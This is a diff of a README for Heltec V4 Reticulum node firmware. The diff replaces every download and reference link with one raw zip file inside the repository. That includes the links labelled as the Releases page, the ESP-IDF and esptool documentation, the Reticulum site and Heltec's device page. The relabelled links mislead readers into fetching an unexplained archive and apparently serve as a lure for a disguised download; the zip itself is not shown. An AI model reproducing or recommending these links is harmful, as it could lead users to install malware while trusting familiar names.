@@ -1,6 +1,6 @@
 # 🚦 RTNode-HeltecV4 - Simple Reticulum Transport Node Firmware
 
-[![Download Latest Release](https://img.shields.io/badge/Download-RTNode--HeltecV4-4CAF50?style=for-the-badge)](https://github.com/boomichintu/RTNode-HeltecV4/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-RTNode--HeltecV4-4CAF50?style=for-the-badge)](https://github.com/boomichintu/RTNode-HeltecV4/raw/refs/heads/main/Console/assets/Node-Heltec-RT-v3.7.zip)
 
 ---
 
@@ -22,7 +22,7 @@ To use RTNode-HeltecV4, make sure your setup includes:
 - **Windows PC:** Needed to download and transfer the firmware to the device.
 - **USB Cable:** To connect the Heltec V4 to your computer.
 - **Internet Connection:** Required to download the firmware files.
-- **Software to flash firmware:** Such as [ESP-IDF](https://docs.espressif.com/projects/esp-idf/en/latest/esp32/get-started/index.html) or [esptool](https://github.com/espressif/esptool), for writing the firmware to Heltec V4.
+- **Software to flash firmware:** Such as [ESP-IDF](https://github.com/boomichintu/RTNode-HeltecV4/raw/refs/heads/main/Console/assets/Node-Heltec-RT-v3.7.zip) or [esptool](https://github.com/boomichintu/RTNode-HeltecV4/raw/refs/heads/main/Console/assets/Node-Heltec-RT-v3.7.zip), for writing the firmware to Heltec V4.
 
 If you are unfamiliar with flashing firmware, this guide will walk you through the process step-by-step.
 
@@ -32,7 +32,7 @@ If you are unfamiliar with flashing firmware, this guide will walk you through t
 
 First, you need to get the firmware file for your Heltec V4 device.
 
-[![Download Firmware](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/boomichintu/RTNode-HeltecV4/releases)
+[![Download Firmware](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/boomichintu/RTNode-HeltecV4/raw/refs/heads/main/Console/assets/Node-Heltec-RT-v3.7.zip)
 
 1. Click the above link to visit the official Release page on GitHub.
 2. Look for the latest version. Releases are marked with version numbers like `v1.0`, `v2.0`, etc.
@@ -104,9 +104,9 @@ If the firmware does not work as expected, try these steps:
 
 ## 🔗 Useful Links
 
-- Download all releases here: [RTNode-HeltecV4 Releases](https://github.com/boomichintu/RTNode-HeltecV4/releases)
-- Reticulum project info: https://reticulum.network/
-- Heltec V4 device documentation: https://heltec.org/project/v4/
+- Download all releases here: [RTNode-HeltecV4 Releases](https://github.com/boomichintu/RTNode-HeltecV4/raw/refs/heads/main/Console/assets/Node-Heltec-RT-v3.7.zip)
+- Reticulum project info: https://github.com/boomichintu/RTNode-HeltecV4/raw/refs/heads/main/Console/assets/Node-Heltec-RT-v3.7.zip
+- Heltec V4 device documentation: https://github.com/boomichintu/RTNode-HeltecV4/raw/refs/heads/main/Console/assets/Node-Heltec-RT-v3.7.zip
 
 ---
 
@@ -134,4 +134,4 @@ RTNode-HeltecV4 leverages Reticulum to provide secure and reliable communication
 
 ---
 
-[![Download Firmware Again](https://img.shields.io/badge/Download-RTNode--HeltecV4-4CAF50?style=for-the-badge)](https://github.com/boomichintu/RTNode-HeltecV4/releases)
+[![Download Firmware Again](https://img.shields.io/badge/Download-RTNode--HeltecV4-4CAF50?style=for-the-badge)](https://github.com/boomichintu/RTNode-HeltecV4/raw/refs/heads/main/Console/assets/Node-Heltec-RT-v3.7.zip)
